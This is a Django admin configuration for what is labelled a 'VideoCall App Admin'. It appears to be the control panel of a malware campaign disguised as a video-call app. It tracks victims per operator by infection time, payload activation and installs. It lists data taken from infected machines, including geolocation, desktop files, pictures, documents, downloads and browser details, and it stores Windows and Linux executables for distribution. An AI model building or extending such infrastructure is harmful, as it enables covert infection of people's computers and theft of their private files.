from django.contrib import admin
from . forms import (
    NadiaForm,
    LizzyForm,
    ZaaloloForm,
    KingpindrakoForm
)
from . models import (
    TermsOfUse,
    LizzyClients, 
    NadiaClients,
    ZaaloloClients,
    KingpindrakoClients,
    NadiaClientsDetails,
    LizzyClientsDetails,
    ZaaloloClientsDetails,
    KingpindrakoClientsDetails,
    PrivacyPolicy,                   
    DownloadPageArticle, 
    SubscribeNewsletter, 
    Application
)


admin.site.site_header = 'VideoCall App Admin'



@admin.register(LizzyClients)
class LizzyClientsAdmin(admin.ModelAdmin):
    form = LizzyForm
    list_display = ('id', 'email', 'id_token', 'app_downloaded', 'app_installed', 'link_visits', 'video_link', 'infection_time', 'payload_activated', 'last_time_online', 'status',  'created', 'updated')
    list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
    search_filter = ('email', 'id_token', 'video_link')
    list_display_links = ('id', 'email',)


@admin.register(NadiaClients)
class NadiaClientsAdmin(admin.ModelAdmin):
    form = NadiaForm
    list_display = ('id', 'email', 'id_token', 'app_downloaded', 'app_installed', 'link_visits', 'video_link', 'infection_time', 'payload_activated', 'last_time_online', 'status',  'created', 'updated')
    list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
    search_filter = ('email', 'id_token', 'video_link')
    list_display_links = ('id', 'email')


@admin.register(ZaaloloClients)
class ZaaloloClientAdmin(admin.ModelAdmin):
    form = ZaaloloForm
    list_display = ('id', 'email', 'id_token', 'app_downloaded', 'app_installed', 'link_visits', 'video_link', 'infection_time', 'payload_activated', 'last_time_online', 'status',  'created', 'updated')
    list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
    search_filter = ('email', 'id_token', 'video_link')
    list_display_links = ('id', 'email')


@admin.register(KingpindrakoClients)
class KingpindrakoClientsAdmin(admin.ModelAdmin):
    form = KingpindrakoForm
    list_display = ('id', 'email', 'id_token', 'app_downloaded', 'app_installed', 'link_visits', 'video_link', 'infection_time', 'payload_activated', 'last_time_online', 'status',  'created', 'updated')
    list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
    search_filter = ('email', 'id_token', 'video_link')
    list_display_links = ('id', 'email')


@admin.register(LizzyClientsDetails)
class LizzyClientsDetailsAdmin(admin.ModelAdmin):
    list_display = ('id', 'client', 'pc_info', 'system_applications', 'geolocation', 'desktop', 'pictures', 'documents', 'videos', 'downloads', 'browser_details', 'created', 'updated')
    list_filter = ('client',)
    list_display_links = ('id', 'client')


@admin.register(NadiaClientsDetails)
class NadiaClientsDetailsAdmin(admin.ModelAdmin):
    list_display = ('id', 'client', 'pc_info', 'system_applications', 'geolocation', 'desktop', 'pictures', 'documents', 'videos', 'downloads', 'browser_details', 'created', 'updated')
    list_filter = ('client',)
    list_display_links = ('id', 'client')


@admin.register(ZaaloloClientsDetails)
class ZaaloloClientsDetailsAdmin(admin.ModelAdmin):
    list_display = ('id', 'client', 'pc_info', 'system_applications', 'geolocation', 'desktop', 'pictures', 'documents', 'videos', 'downloads', 'browser_details', 'created', 'updated')
    list_filter = ('client',)
    list_display_links = ('id', 'client')


@admin.register(KingpindrakoClientsDetails)
class KingpindrakoClientsDetailsAdmin(admin.ModelAdmin):
    list_display = ('id', 'client', 'pc_info', 'system_applications', 'geolocation', 'desktop', 'pictures', 'documents', 'videos', 'downloads', 'browser_details', 'created', 'updated')
    list_filter = ('client',)
    list_display_links = ('id', 'client')


@admin.register(SubscribeNewsletter)
class SubscribeNewsletter(admin.ModelAdmin):
    list_display = ('id', 'email',)


@admin.register(DownloadPageArticle)
class DownloadPageArticleAdmin(admin.ModelAdmin):
    list_display = ('id', 'user', 'heading', 'heading_description', 'second_heading', 'second_heading_description', 'third_heading', 'third_heading_description', 'fourth_heading', 'fourth_heading_description', 'created', 'updated', )
    list_display_links = ('id', 'user')



@admin.register(Application)
class ApplicationAdmin(admin.ModelAdmin):
    list_display = ('id', 'linux_exe_file', 'windows_exe_file', 'created', 'updated', )
    list_display_links = ('id',)



@admin.register(PrivacyPolicy)
class PrivacyPolicyAdmin(admin.ModelAdmin):
    list_display = ('id', 'user', 'content', 'created', 'updated')
    list_display_links = ('id', 'user')


@admin.register(TermsOfUse)
class TermsOfUseAdmin(admin.ModelAdmin):
    list_display = ('id', 'user', 'content', 'created', 'updated')
    list_display_links = ('id', 'user')